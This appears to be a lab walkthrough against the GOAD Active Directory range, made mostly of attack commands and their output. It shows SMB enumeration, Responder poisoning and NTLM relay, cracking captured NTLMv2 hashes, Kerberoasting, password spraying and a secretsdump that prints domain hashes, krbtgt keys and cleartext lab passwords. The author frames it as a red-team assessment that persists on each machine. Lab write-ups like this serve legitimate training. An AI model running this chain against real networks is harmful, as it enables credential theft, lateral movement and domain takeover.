# GOAD
GOAD Exploitation


```nxc smb 192.168.56.0/24```

```
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.12   445    MEEREEN          [*] Windows 10 / Server 2016 Build 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows 10 / Server 2016 Build 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

<img width="1917" height="339" alt="image" src="https://github.com/user-attachments/assets/29201094-110c-4bc5-991a-2fbc9cd4f0df" />

<img width="569" height="171" alt="image" src="https://github.com/user-attachments/assets/db0b5fe1-b8a2-4019-a0da-aacb4bb227b4" />

```nxc smb ips.txt -u anonymous -p '' --shares```

<img width="1914" height="675" alt="image" src="https://github.com/user-attachments/assets/1303e32d-2f52-4f13-b604-e15281991eb2" />

```https://raw.githubusercontent.com/overgrowncarrot1/SMB_Killer/refs/heads/main/SMB_Killer.py```

```python3 SMB_Killer.py -r 192.168.56.23 -l 192.168.14.130 -d essos.local -i eth0 -a all -U anonymous -P '' -A```

<img width="1465" height="506" alt="image" src="https://github.com/user-attachments/assets/4573ed73-1423-4c90-8469-26a367691c30" />

Left that running:

Back on the Ubuntu machine which houses GOAD

```git clone https://github.com/SpiderLabs/Responder```

```sudo PYTHONPATH=$PYTHONPATH:/home/ubuntu/.local/lib/python3.12/site-packages python3 Responder.py -I vboxnet0```

<img width="1656" height="667" alt="image" src="https://github.com/user-attachments/assets/e5673e0c-cd77-4260-b858-a82abcb08be8" />

Left that running and go back to Kali.

BACK ON KALI WE GET A HIT WITH MY SMB_KILLER

<img width="1910" height="573" alt="image" src="https://github.com/user-attachments/assets/c8c2a651-eac1-4cdc-88ce-f2534f0bb6f8" />

```echo 'eddard.stark::NORTH:006d8fe3bfc52692:230EE06E093D732C53AAA5719A4D9D4A:010100000000000000D82E26751BDC017A7619C4FCE75E230000000002000800360058003100480001001E00570049004E002D003500530046004C00300049004B00480046003300340004003400570049004E002D003500530046004C00300049004B0048004600330034002E0036005800310048002E004C004F00430041004C000300140036005800310048002E004C004F00430041004C000500140036005800310048002E004C004F00430041004C000700080000D82E26751BDC01060004000200000008003000300000000000000000000000003000007C5B0E3220490769FC1F353741F8A5F1B10FCB202220DECB9AECCA7CF887B5480A001000000000000000000000000000000000000900140063006900660073002F004D006500720065006E000000000000000000' > hash.txt```

```hashcat hash.txt /usr/share/wordlists/rockyou.txt```

<img width="1907" height="536" alt="image" src="https://github.com/user-attachments/assets/940bf663-c7a4-4c23-8b37-3f246651c3d2" />

Didn't crack, lets start up NTLM Relay on Kali

<img width="870" height="433" alt="image" src="https://github.com/user-attachments/assets/a0716f59-01e9-4df1-923a-15e7ca8bf4fb" />

<img width="1920" height="512" alt="image" src="https://github.com/user-attachments/assets/45d4c79c-7b8e-450a-9d54-0316469dfa32" />

SCF, URL and XML files are still sitting on the machine, so we can just start NTLM relay if we want.

```ntlmrelayx.py -smb2support -tf signing_false.txt```

We will leave that up and running.

<img width="992" height="536" alt="image" src="https://github.com/user-attachments/assets/4a43910a-b546-4061-94fd-5de417b28ddd" />

Now going back on Ubuntu which houses GOAD looks like Responder.py got a hit:

<img width="1854" height="645" alt="image" src="https://github.com/user-attachments/assets/1382a2ad-5b76-40e4-bd25-c25b25c85a9c" />

```echo 'robb.stark::NORTH:c962d3dfca6ebc8f:58CEFEEB83BAFF49E6DA179D2B787BC2:010100000000000080AB6A26541BDC019896789241E29E9A0000000002000800350057004300360001001E00570049004E002D0050005700440036004C004B003500520058003900520004003400570049004E002D0050005700440036004C004B00350052005800390052002E0035005700430036002E004C004F00430041004C000300140035005700430036002E004C004F00430041004C000500140035005700430036002E004C004F00430041004C000700080080AB6A26541BDC01060004000200000008003000300000000000000000000000003000007C5B0E3220490769FC1F353741F8A5F1B10FCB202220DECB9AECCA7CF887B5480A001000000000000000000000000000000000000900160063006900660073002F0042007200610076006F0073000000000000000000' > hash.txt```

```echo 'eddard.stark::NORTH:53b2ed20c6235a46:CA90CEBD69614F12BE91673908C18C75:010100000000000080AB6A26541BDC017FDFF936B8D54C270000000002000800350057004300360001001E00570049004E002D0050005700440036004C004B003500520058003900520004003400570049004E002D0050005700440036004C004B00350052005800390052002E0035005700430036002E004C004F00430041004C000300140035005700430036002E004C004F00430041004C000500140035005700430036002E004C004F00430041004C000700080080AB6A26541BDC01060004000200000008003000300000000000000000000000003000007C5B0E3220490769FC1F353741F8A5F1B10FCB202220DECB9AECCA7CF887B5480A001000000000000000000000000000000000000900140063006900660073002F004D006500720065006E000000000000000000' >> hash.txt```

<img width="1897" height="335" alt="image" src="https://github.com/user-attachments/assets/77e9efe7-ae86-4961-baa0-cbe326edf624" />

```hashcat hash.txt /usr/share/wordlists/rockyou.txt```

<img width="1900" height="119" alt="image" src="https://github.com/user-attachments/assets/a4a48b47-9b44-410a-a355-0cf115fc10b1" />

```echo 'robb.stark:sexywolfy' >> user_pass.txt```

<img width="596" height="98" alt="image" src="https://github.com/user-attachments/assets/d445bf8c-917a-4ed1-9832-0cb99b92c35f" />

```nxc smb ips.txt -u robb.stark -p sexywolfy --shares```

<img width="1173" height="181" alt="image" src="https://github.com/user-attachments/assets/70c979a8-bf6b-4a00-8876-1bc239da0b58" />

Too easy... lets look for more. We are not going to treat this a get to DA on each machine, we are going to treat it as a Red Team assessment where we find multiple ways and persist on each machine...

```nxc smb ips.txt -u robb.stark -p sexywolfy --users```

<img width="1678" height="393" alt="image" src="https://github.com/user-attachments/assets/8741ea70-25c0-4fdc-abc8-6b17d9706f66" />

```echo 'samwell.tarly:Heartsbane' > user_pass.txt```

```GetUserSPNs.py north.sevenkingdoms.local/samwell.tarly:Heartsbane -request > kerb_hashes.txt```

<img width="1908" height="678" alt="image" src="https://github.com/user-attachments/assets/c6e9853b-e0ce-49c8-be5c-aaa520dd9cc1" />

```hashcat kerb_hashes.txt /usr/share/wordlists/rockyou.txt```

<img width="1915" height="342" alt="image" src="https://github.com/user-attachments/assets/cad0eac4-d3e0-4cdf-b378-fd6d47d51ca8" />

```echo 'jon.snow:iknownothing' >> user_pass.txt```

```ldapsearch -H ldap://192.168.56.11 -x -b "DC=north,DC=sevenkingdoms,DC=local" '(objectclass=person)' -w sexywolfy -D north\\robb.stark > ldap.txt```

```cat ldap.txt| grep -ia samaccountname > a.txt; cut -d ':' -f 2 a.txt > b.txt; sed 's/[[:space:]]//g' b.txt > users.txt```

<img width="1369" height="617" alt="image" src="https://github.com/user-attachments/assets/e044bcd8-b0e4-4ba9-b444-07f8706f03c5" />

```nxc smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforce --continue-on-success```

vagrant:vagrant will be on all the machines, I also have admin:P@ssw0rd! which is not on machines originally, so ignore those.

<img width="1902" height="595" alt="image" src="https://github.com/user-attachments/assets/6c58a645-d46f-4fc8-ae2b-efe692fccd4e" />

<img width="601" height="78" alt="image" src="https://github.com/user-attachments/assets/1aab0d26-2405-45ee-ab14-7e2bb24ade58" />

<img width="604" height="158" alt="image" src="https://github.com/user-attachments/assets/d17faba7-8ea4-40a1-a78e-4a6291908b52" />

```bloodhound-python -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local -c all -ns 192.168.56.11```

If you are getting errors do the following

in /etc/resolv.conf

<img width="1107" height="180" alt="image" src="https://github.com/user-attachments/assets/d228f96f-cce7-4f3c-a796-e56fdcd35714" />

in /etc/hosts

<img width="1000" height="243" alt="image" src="https://github.com/user-attachments/assets/2efec53e-b516-4ff6-9828-48e38da05e29" />

Rerun, this time we are going to run with a zip and then rename so we can run on different domains and not get confused.

```bloodhound-python -c All -d north.sevenkingdoms.local -u samwell.tarly -p Heartsbane -dc winterfell.north.sevenkingdoms.local -ns 192.168.56.11 --zip```

```mv 20250901203721_bloodhound.zip winterfell_bloodhound.zip```

<img width="1711" height="578" alt="image" src="https://github.com/user-attachments/assets/791a13f1-814a-4fae-b5bb-11cb3e60b757" />

```bloodhound-python -u samwell.tarly@north.sevenkingdoms.local -p Heartsbane -d essos.local -ns 192.168.56.11 -c All --zip```

<img width="1395" height="598" alt="image" src="https://github.com/user-attachments/assets/e02a80a3-742c-45db-931d-da8de2ff1c43" />

Now remember Robb.Stark, and we Pwned the machine with him, lets do a secrets dump.

```secretsdump.py 'north.sevenkingdoms.local/robb.stark:sexywolfy'@192.168.56.11```

<img width="1908" height="634" alt="image" src="https://github.com/user-attachments/assets/8f37a3e1-0646-4ca4-bb1a-9fa640ea19a7" />

```
Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x5dedd35a9a6aed7591474678881702c6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
NORTH\WINTERFELL$:aes256-cts-hmac-sha1-96:63c4054b6af28c8e304dcb9e7004f5323bd1f3ea1d8ee301f258adfc93ea3b64
NORTH\WINTERFELL$:aes128-cts-hmac-sha1-96:b2a4c6ca63185ae56b25296dcabd25d9
NORTH\WINTERFELL$:des-cbc-md5:52158fef8f587a4f
NORTH\WINTERFELL$:plain_password_hex:31c67bbec5d00d22ba9c15dc2faae4ac2198e8657e8b3b91ca0569c22f97a8d1e2bb5ee02bae7662b0a92679cc31775bc6f927a8455ea0360449d5031e9705df103f4a1a7df58261f8ca3690945257d7dfe3caeed213229b8032cf457840ed3374a2858eb3bf0fbbd06303f3b9dd0db39687dbaf08fd0cdad78233408e0e792b25d36e7c4424064909ce5126eff1b594a67a815763ca9f6bfa3f3d391a976877066187e9cc4835c9a00962f4d40f770b9e3eb75d482e12f3efe72d38b540579b8720f8e8d4f831993999c8a5ec3e81431e1758feedc8ce8ff31d4864e78528806e335c85d185db084aa517b8ae217626
NORTH\WINTERFELL$:aad3b435b51404eeaad3b435b51404ee:aeda9ec2420a3c34cfca63d0c8120527:::
[*] DefaultPassword 
NORTH\robb.stark:sexywolfy
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb84e23a8f8dfd313eda10c176334f1a91123d715
dpapi_userkey:0xe557eb75b7dc3ca367d952b8d17ee130fd08aac8
[*] NL$KM 
 0000   22 34 01 76 01 70 30 93  88 A7 6B B2 87 43 59 69   "4.v.p0...k..CYi
 0010   0E 41 BD 22 0A 0C CC 23  3A 5B B6 74 CB 90 D6 35   .A."...#:[.t...5
 0020   14 CA D8 45 4A F0 DB 72  D5 CF 3B A1 ED 7F 3A 98   ...EJ..r..;...:.
 0030   CD 4D D6 36 6A 35 24 2D  A0 EB 0F 8E 3F 52 81 C9   .M.6j5$-....?R..
NL$KM:223401760170309388a76bb2874359690e41bd220a0ccc233a5bb674cb90d63514cad8454af0db72d5cf3ba1ed7f3a98cd4dd6366a35242da0eb0f8e3f5281c9
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:001bd296155c65ed051f83a8d32fbed1:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
arya.stark:1110:aad3b435b51404eeaad3b435b51404ee:4f622f4cd4284a887228940e2ff4e709:::
eddard.stark:1111:aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8:::
catelyn.stark:1112:aad3b435b51404eeaad3b435b51404ee:cba36eccfd9d949c73bc73715364aff5:::
robb.stark:1113:aad3b435b51404eeaad3b435b51404ee:831486ac7f26860c9e2f51ac91e1a07a:::
sansa.stark:1114:aad3b435b51404eeaad3b435b51404ee:b777555c2e2e3716e075cc255b26c14d:::
brandon.stark:1115:aad3b435b51404eeaad3b435b51404ee:84bbaa1c58b7f69d2192560a3f932129:::
rickon.stark:1116:aad3b435b51404eeaad3b435b51404ee:7978dc8a66d8e480d9a86041f8409560:::
hodor:1117:aad3b435b51404eeaad3b435b51404ee:337d2667505c203904bd899c6c95525e:::
jon.snow:1118:aad3b435b51404eeaad3b435b51404ee:b8d76e56e9dac90539aff05e3ccb1755:::
samwell.tarly:1119:aad3b435b51404eeaad3b435b51404ee:f5db9e027ef824d029262068ac826843:::
jeor.mormont:1120:aad3b435b51404eeaad3b435b51404ee:6dccf1c567c56a40e56691a723a49664:::
sql_svc:1121:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
admin:1122:aad3b435b51404eeaad3b435b51404ee:217e50203a5aba59cefa863c724bf61b:::
john:1123:aad3b435b51404eeaad3b435b51404ee:98da674948a73eb2cfa124e9aca27a03:::
WINTERFELL$:1001:aad3b435b51404eeaad3b435b51404ee:aeda9ec2420a3c34cfca63d0c8120527:::
CASTELBLACK$:1105:aad3b435b51404eeaad3b435b51404ee:832ae8f5a277bd13c7eb960c6da6a791:::
SEVENKINGDOMS$:1104:aad3b435b51404eeaad3b435b51404ee:5c4327138239cddd20a99eca1da0b476:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:e7aa0f8a649aa96fab5ed9e65438392bfc549cb2695ac4237e97996823619972
Administrator:aes128-cts-hmac-sha1-96:bb7b6aed58a7a395e0e674ac76c28aa0
Administrator:des-cbc-md5:fe58cdcd13a43243
krbtgt:aes256-cts-hmac-sha1-96:bfa67641c29c6a473170a49fa00555437de22362873c4d7817ad03a0580a051e
krbtgt:aes128-cts-hmac-sha1-96:6195834ab8d455259aa66d314da7b0c8
krbtgt:des-cbc-md5:a426a1046e0d6713
vagrant:aes256-cts-hmac-sha1-96:aa97635c942315178db04791ffa240411c36963b5a5e775e785c6bd21dd11c24
vagrant:aes128-cts-hmac-sha1-96:0d7c6160ffb016857b9af96c44110ab1
vagrant:des-cbc-md5:16dc9e8ad3dfc47f
arya.stark:aes256-cts-hmac-sha1-96:2001e8fb3da02f3be6945b4cce16e6abdd304974615d6feca7d135d4009d4f7d
arya.stark:aes128-cts-hmac-sha1-96:8477cba28e7d7cfe5338d172a23d74df
arya.stark:des-cbc-md5:13525243d6643285
eddard.stark:aes256-cts-hmac-sha1-96:f6b4d01107eb34c0ecb5f07d804fa9959dce6643f8e4688df17623b847ec7fc4
eddard.stark:aes128-cts-hmac-sha1-96:5f9b06a24b90862367ec221a11f92203
eddard.stark:des-cbc-md5:8067f7abecc7d346
catelyn.stark:aes256-cts-hmac-sha1-96:c8302e270b04252251de40b2bd5fba37395b55d5ed9ac95e03213dc739827283
catelyn.stark:aes128-cts-hmac-sha1-96:50ce7e2ad069fa40fb2bc7f5f9643d93
catelyn.stark:des-cbc-md5:6b314670a2f84cfb
robb.stark:aes256-cts-hmac-sha1-96:d7df5069178bbc93fdc34bbbcb8e374fd75c44d6ce51000f24688925cc4d9c2a
robb.stark:aes128-cts-hmac-sha1-96:b2965905e68356d63fedd9904357cc42
robb.stark:des-cbc-md5:c4b62c797f5dd01f
sansa.stark:aes256-cts-hmac-sha1-96:a268e7a385f4f165c6489c18a3bdeb52c5e505050449c6f9aeba4bc06a7fcbed
sansa.stark:aes128-cts-hmac-sha1-96:e2e6e885f6f4d3e25d759ea624961392
sansa.stark:des-cbc-md5:4c7c16e3f74cc4d3
brandon.stark:aes256-cts-hmac-sha1-96:6dd181186b68898376d3236662f8aeb8fa68e4b5880744034d293d18b6753b10
brandon.stark:aes128-cts-hmac-sha1-96:9de3581a163bd056073b71ab23142d73
brandon.stark:des-cbc-md5:76e61fda8a4f5245
rickon.stark:aes256-cts-hmac-sha1-96:79ffda34e5b23584b3bd67c887629815bb9ab8a1952ae9fda15511996587dcda
rickon.stark:aes128-cts-hmac-sha1-96:d4a0669b1eff6caa42f2632ebca8cd8d
rickon.stark:des-cbc-md5:b9ec3b8f2fd9d98a
hodor:aes256-cts-hmac-sha1-96:a33579ec769f3d6477a98e72102a7f8964f09a745c1191a705d8e1c3ab6e4287
hodor:aes128-cts-hmac-sha1-96:929126dcca8c698230b5787e8f5a5b60
hodor:des-cbc-md5:d5764373f2545dfd
jon.snow:aes256-cts-hmac-sha1-96:5a1bc13364e758131f87a1f37d2f1b1fa8aa7a4be10e3fe5a69e80a5c4c408fb
jon.snow:aes128-cts-hmac-sha1-96:d8bc99ccfebe2d6e97d15f147aa50e8b
jon.snow:des-cbc-md5:084358ceb3290d7c
samwell.tarly:aes256-cts-hmac-sha1-96:b66738c4d2391b0602871d0a5cd1f9add8ff6b91dcbb7bc325dc76986496c605
samwell.tarly:aes128-cts-hmac-sha1-96:3943b4ac630b0294d5a4e8b940101fae
samwell.tarly:des-cbc-md5:5efed0e0a45dd951
jeor.mormont:aes256-cts-hmac-sha1-96:be10f893afa35457fcf61ecc40dc032399b7aee77c87bb71dd2fe91411d2bd50
jeor.mormont:aes128-cts-hmac-sha1-96:1b0a98958e19d6092c8e8dc1d25c788b
jeor.mormont:des-cbc-md5:1a68641a3e9bb6ea
sql_svc:aes256-cts-hmac-sha1-96:24d57467625d5510d6acfddf776264db60a40c934fcf518eacd7916936b1d6af
sql_svc:aes128-cts-hmac-sha1-96:01290f5b76c04e39fb2cb58330a22029
sql_svc:des-cbc-md5:8645d5cd402f16c7
admin:aes256-cts-hmac-sha1-96:742ab59477ab015049db4b3fe8a66d23f64660407e7a99a6fcb21e9f870bd852
admin:aes128-cts-hmac-sha1-96:a09da32be0c7816b5a2384c56abd471f
admin:des-cbc-md5:eaf2d0203d3b1f89
john:aes256-cts-hmac-sha1-96:8ba283d377a9a632bedc8d865bcb1ebdde885b2b5cf2734c6885dd8608a0a7d4
john:aes128-cts-hmac-sha1-96:289d5135303e0167b7619f405cb05cdd
john:des-cbc-md5:9ef47f9ed307e51c
WINTERFELL$:aes256-cts-hmac-sha1-96:63c4054b6af28c8e304dcb9e7004f5323bd1f3ea1d8ee301f258adfc93ea3b64
WINTERFELL$:aes128-cts-hmac-sha1-96:b2a4c6ca63185ae56b25296dcabd25d9
WINTERFELL$:des-cbc-md5:c8ec52d5943226cb
CASTELBLACK$:aes256-cts-hmac-sha1-96:304c5473ebfee830546a985fc2deed7437cc253be48ee963a963224907b55d4f
CASTELBLACK$:aes128-cts-hmac-sha1-96:67d0322bb90005c48c3db1bb01f74268
CASTELBLACK$:des-cbc-md5:2397620779e9a74a
SEVENKINGDOMS$:aes256-cts-hmac-sha1-96:7c76215b4ec3e14d3ecaba63a3bfa22728ddccfa06658a1dc4be1e4ab1fa7eca
SEVENKINGDOMS$:aes128-cts-hmac-sha1-96:c8acb6946f56f2b5bfee02ed2ca15bf7
SEVENKINGDOMS$:des-cbc-md5:5864a2130462a77f
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```


























